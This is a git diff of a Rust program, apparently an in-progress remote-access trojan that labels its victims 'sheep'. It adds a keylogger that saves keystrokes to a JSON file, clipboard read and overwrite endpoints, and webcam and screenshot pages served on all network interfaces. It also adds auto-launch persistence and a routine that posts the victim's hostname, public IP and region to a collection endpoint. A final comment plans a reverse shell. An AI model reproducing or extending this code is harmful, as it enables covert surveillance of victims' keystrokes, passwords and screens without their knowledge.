@@ -1,20 +1,87 @@
 use actix_files::NamedFile;
 use actix_web::{web, App, HttpResponse, HttpServer, Result};
 use arboard::Clipboard;
+use chrono::Local;
 use local_ip_address::local_ip;
+use rdev::{listen, Event};
 use reqwest;
+use reqwest::Client;
 use serde::Deserialize;
+use serde::Serialize;
 use std::collections::HashMap;
-use std::io;
+use std::fs::OpenOptions;
+use std::io::{Read, Write};
 use std::path::PathBuf;
 use std::process::Command;
 use std::sync::Mutex;
+use std::thread;
+use std::{fs, io};
 use sysinfo::System;
-use tokio::time::sleep;
+use tokio::task;
 use whoami;
-
 struct AppState {
     screenshot_file: Mutex<String>,
+    clipboard: Mutex<String>,
+}
+
+// Information list function
+#[derive(Deserialize)]
+struct IpInfo {
+    ip: String,
+    region: String,
+    org: String,
+}
+
+#[derive(serde::Serialize)]
+struct SheepInfo {
+    name: String,
+    ip: String,
+    region: String,
+    webcams: Vec<String>,
+    screenshots: Vec<String>,
+    keylog: Vec<KeylogEntry>,
+    clipboard: Vec<ClipboardEntry>,
+    screenshot: Vec<ScreenshotEntry>,
+    devices: Vec<String>,
+    hardware: HardwareInfo,
+    os: OsInfo,
+}
+
+#[derive(serde::Serialize)]
+struct KeylogEntry {
+    keylogDate: String,
+    data: String,
+}
+
+#[derive(serde::Serialize)]
+struct ClipboardEntry {
+    clipboardDate: String,
+    data: String,
+}
+
+#[derive(serde::Serialize)]
+struct ScreenshotEntry {
+    screenshotDate: String,
+    file: String,
+}
+
+#[derive(serde::Serialize)]
+struct HardwareInfo {
+    cpu: String,
+    ram: String,
+    storage: String,
+    gpu: String,
+}
+
+#[derive(serde::Serialize)]
+struct OsInfo {
+    name: String,
+    version: String,
+}
+
+#[derive(Serialize, Deserialize)]
+struct KeylogData {
+    keylogs: HashMap<String, Vec<String>>,
 }
 
 // Index page handler
@@ -68,7 +135,7 @@ async fn screenshot() -> Result<HttpResponse> {
     Ok(HttpResponse::Ok()
         .content_type("text/html")
         .body(include_str!("../static/screenshot.html")))
-}
+} // Information list function
 
 // Get screenshot handler
 async fn get_screenshot() -> Result<NamedFile> {
@@ -83,12 +150,40 @@ async fn camera() -> Result<HttpResponse> {
         .body(include_str!("../static/camera.html")))
 }
 
-// Information list function
-#[derive(Deserialize)]
-struct IpInfo {
-    ip: String,
-    region: String,
-    org: String,
+// Keylog page handler
+async fn keylog() -> Result<HttpResponse> {
+    let log_file_path = "./log/key.json";
+
+    // Lire le contenu du fichier
+    let file_content = match fs::read_to_string(log_file_path) {
+        Ok(content) => content,
+        Err(_) => return Ok(HttpResponse::InternalServerError().body("Failed to read keylog file")),
+    };
+
+    // Renvoie le contenu du fichier
+    Ok(HttpResponse::Ok()
+        .content_type("application/json")
+        .body(file_content))
+}
+
+// Clipboard view function
+async fn clipboard_view() -> Result<HttpResponse> {
+    let mut clipboard = Clipboard::new().unwrap();
+    match clipboard.get_text() {
+        Ok(text) => Ok(HttpResponse::Ok().body(text)),
+        Err(e) => Ok(HttpResponse::InternalServerError()
+            .body(format!("Failed to get clipboard content: {}", e))),
+    }
+}
+
+// Clipboard send function
+async fn clipboard_send(body: String) -> Result<HttpResponse> {
+    let mut clipboard = Clipboard::new().unwrap();
+    match clipboard.set_text(body.clone()) {
+        Ok(_) => Ok(HttpResponse::Ok().body(format!("Clipboard text is now: \"{}\"", body))),
+        Err(e) => Ok(HttpResponse::InternalServerError()
+            .body(format!("Failed to set clipboard content: {}", e))),
+    }
 }
 
 async fn get_public_ip_info() -> Result<IpInfo, reqwest::Error> {
@@ -144,82 +239,94 @@ async fn display_system_info() -> Result<(), Box<dyn std::error::Error>> {
 
     let default_gateway = get_default_gateway().unwrap_or_else(|_| "Unknown".to_string());
 
-    let mut system_info = HashMap::new();
-    system_info.insert("CPU Name", cpu_name.to_string());
-    system_info.insert("CPU Usage", format!("{:.2}%", cpu_usage));
-    system_info.insert("Total Memory", format!("{} MB", total_memory / 1024));
-    system_info.insert("Used Memory", format!("{} MB", used_memory / 1024));
-    system_info.insert("Hostname", hostname);
-    system_info.insert("Username", username);
-    system_info.insert("Real Name", realname);
-    system_info.insert("OS", os);
-    system_info.insert("Device Name", device_name);
-    system_info.insert("Desktop Environment", format!("{:?}", desktop_env));
-    system_info.insert("Platform", format!("{:?}", platform));
-    system_info.insert("Architecture", format!("{:?}", architecture));
-    system_info.insert("Private IP", private_ip.to_string());
-    system_info.insert("Public IP", public_ip_info.ip);
-    system_info.insert("Region", public_ip_info.region);
-    system_info.insert("ISP", public_ip_info.org);
-    system_info.insert("Default Gateway", default_gateway);
+    let hardware = HardwareInfo {
+        cpu: cpu_name.to_string(),
+        ram: format!("{} MB", total_memory / 1024),
+        storage: "Unknown".to_string(), // Vous pouvez obtenir cette information en utilisant une méthode appropriée
+        gpu: "Unknown".to_string(), // Vous pouvez obtenir cette information en utilisant une méthode appropriée
+    };
 
-    for (key, value) in &system_info {
-        println!("{}: {}", key, value);
+    let os_info = OsInfo {
+        name: os,
+        version: "Unknown".to_string(), // Vous pouvez obtenir cette information en utilisant une méthode appropriée
+    };
+
+    let sheep_info = SheepInfo {
+        name: hostname,
+        ip: public_ip_info.ip,
+        region: public_ip_info.region,
+        webcams: vec!["localhost:8080/camera".to_string()],
+        screenshots: vec!["localhost:8080/screenshot".to_string()],
+        keylog: vec![],
+        clipboard: vec![],
+        screenshot: vec![],
+        devices: vec![],
+        hardware,
+        os: os_info,
+    };
+
+    let client = Client::new();
+    let res = client
+        .post("http://localhost:5000/good-sheep")
+        .json(&sheep_info)
+        .send()
+        .await?;
+
+    if res.status().is_success() {
+        println!("System info successfully sent!");
+    } else {
+        eprintln!("Failed to send system info: {}", res.status());
     }
 
     Ok(())
 }
 
-// Key/mouse logger function
 fn log_key_mouse() {
-    use rdev::{listen, Event};
+    // Chemin du fichier JSON
+    let log_file_path = "./log/key.json";
 
-    if let Err(error) = listen(callback) {
+    // Lire le fichier JSON existant ou créer un nouvel objet KeylogData
+    let mut keylog_data: KeylogData =
+        if let Ok(mut file) = OpenOptions::new().read(true).open(log_file_path) {
+            let mut content = String::new();
+            file.read_to_string(&mut content).unwrap();
+            serde_json::from_str(&content).unwrap_or(KeylogData {
+                keylogs: HashMap::new(),
+            })
+        } else {
+            KeylogData {
+                keylogs: HashMap::new(),
+            }
+        };
+
+    // Fonction de callback pour écouter les frappes au clavier
+    fn callback(event: Event, keylog_data: &mut KeylogData) {
+        if let Some(key) = event.name {
+            let current_date = Local::now().format("%d/%m/%Y").to_string();
+
+            // Ajouter la frappe à la date correspondante
+            keylog_data
+                .keylogs
+                .entry(current_date)
+                .or_insert_with(Vec::new)
+                .push(key);
+
+            // Écrire les données mises à jour dans le fichier JSON
+            let serialized_data = serde_json::to_string(&keylog_data).unwrap();
+            let mut file = OpenOptions::new()
+                .write(true)
+                .create(true)
+                .truncate(true)
+                .open("./log/key.json")
+                .unwrap();
+            file.write_all(serialized_data.as_bytes()).unwrap();
+        }
+    }
+
+    // Écouter les frappes au clavier
+    if let Err(error) = listen(move |event| callback(event, &mut keylog_data)) {
         println!("Error: {:?}", error)
     }
-
-    fn callback(event: Event) {
-        println!("My callback {:?}", event);
-        match event.name {
-            Some(string) => println!("User wrote {:?}", string),
-            None => (),
-        }
-    }
-}
-
-// Clipboard listen function
-async fn clipboard_listen() {
-    let mut clipboard = Clipboard::new().unwrap();
-    let mut previous_content = String::new();
-
-    loop {
-        match clipboard.get_text() {
-            Ok(current_content) => {
-                if current_content != previous_content {
-                    println!("Clipboard content changed: {}", current_content);
-                    previous_content = current_content;
-                }
-            }
-            Err(e) => {
-                println!("Failed to get clipboard content: {}", e);
-            }
-        }
-        sleep(tokio::time::Duration::from_secs(1)).await;
-    }
-}
-
-// Clipboard send function
-fn clipboard_send() {
-    let mut clipboard = Clipboard::new().unwrap();
-
-    match clipboard.get_text() {
-        Ok(text) => println!("Clipboard text was: {}", text),
-        Err(e) => println!("Failed to get clipboard content: {}", e),
-    }
-
-    let new_text = "Hello, world!";
-    clipboard.set_text(new_text).unwrap();
-    println!("Clipboard text is now: \"{}\"", new_text);
 }
 
 // Auto-launch function
@@ -249,33 +356,44 @@ fn setup_autolaunch() {
 // Main function
 #[actix_web::main]
 async fn main() -> io::Result<()> {
-    // let app_state = web::Data::new(AppState {
-    //     screenshot_file: Mutex::new(String::from("screenshot.png")),
-    // });
+    // Premier thread : serveur HTTP
+    let app_state = web::Data::new(AppState {
+        screenshot_file: Mutex::new(String::from("screenshot.png")),
+        clipboard: Mutex::new(String::new()),
+    });
 
-    // // Start the HTTP server
-    // HttpServer::new(move || {
-    //     App::new()
-    //         .app_data(app_state.clone())
-    //         .route("/", web::get().to(index))
-    //         .route("/screenshot", web::get().to(screenshot))
-    //         .route("/get_screenshot", web::get().to(get_screenshot))
-    //         .route("/camera", web::get().to(camera))
-    // })
-    // .bind("127.0.0.1:8080")?
-    // .run()
-    // .await?;
+    let server = HttpServer::new(move || {
+        App::new()
+            .app_data(app_state.clone())
+            .route("/", web::get().to(index))
+            .route("/screenshot", web::get().to(screenshot))
+            .route("/get_screenshot", web::get().to(get_screenshot))
+            .route("/camera", web::get().to(camera))
+            .route("/keylog", web::get().to(keylog))
+            .route("/clipboard-view", web::get().to(clipboard_view))
+            .route("/clipboard-send", web::post().to(clipboard_send))
+    })
+    .bind("0.0.0.0:8080")?
+    .run();
 
-    // Start the other functions
-    // log_key_mouse();
+    // Deuxième thread : log des événements clavier/souris
+    thread::spawn(|| {
+        log_key_mouse();
+    });
 
-    clipboard_send();
-    setup_autolaunch();
-    if let Err(err) = display_system_info().await {
-        eprintln!("Failed to display system info: {}", err);
-    }
-    clipboard_listen().await;
+    // Quatrième thread : configuration de l'auto-lancement
+    thread::spawn(|| {
+        setup_autolaunch();
+    });
 
-    Ok(())
+    // Cinquième tâche : affichage des informations système
+    task::spawn(async {
+        if let Err(err) = display_system_info().await {
+            eprintln!("Failed to display system info: {}", err);
+        }
+    });
+
+    // Attendre que le serveur HTTP se termine
+    server.await
 }
 // need reverse shell + python client
